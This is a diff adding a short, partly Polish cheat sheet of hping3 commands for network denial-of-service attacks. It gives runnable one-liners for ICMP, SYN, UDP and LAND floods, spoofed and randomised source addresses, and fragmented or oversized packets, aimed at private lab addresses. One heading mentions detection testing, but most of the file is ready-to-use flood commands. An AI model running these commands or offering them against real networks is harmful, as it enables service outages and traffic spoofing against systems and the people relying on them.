@@ -1,0 +1,31 @@
+DDOS
+hping3 -1 --flood 192.168.11.11 (target)  -a 192.168.11.10 (spoofed)
+
+DDOS na http, random source IP
+hping3 -c 100000 (numbers of packets to send) -d 120 (size of each packet) -S (SYN) -w 64 (windows size) -p 80 (http) --flood -rand-source Target
+
+
+IP source Route options attack
+
+
+DDOS session table flood
+
+
+UDP Flood attack
+hping3 --flood --rand-source --udp -445 IP
+
+ICMP flood attack
+hping3 --flood --rand-source --icmp -p 445 IP
+
+DOS LAND ATTACK :)
+hping3 192.168.11.11 -a 192.168.11.11 (IP musza być takie same) --icmp --flood
+
+ICMP abnormalities detection
+fragment ICMP and length bigger than 1024bytes:
+hping3 192.168.0.102 -1 -a 0.0.0.0 -d 6000 (bytes)
+
+IP packets fragments
+hping3 192.168.11.10 -a 0.0.0.1 -f
+
+SYN fragments
+hping3 192.168.11.10 -a 0.0.0.1 -S -f (fragments)
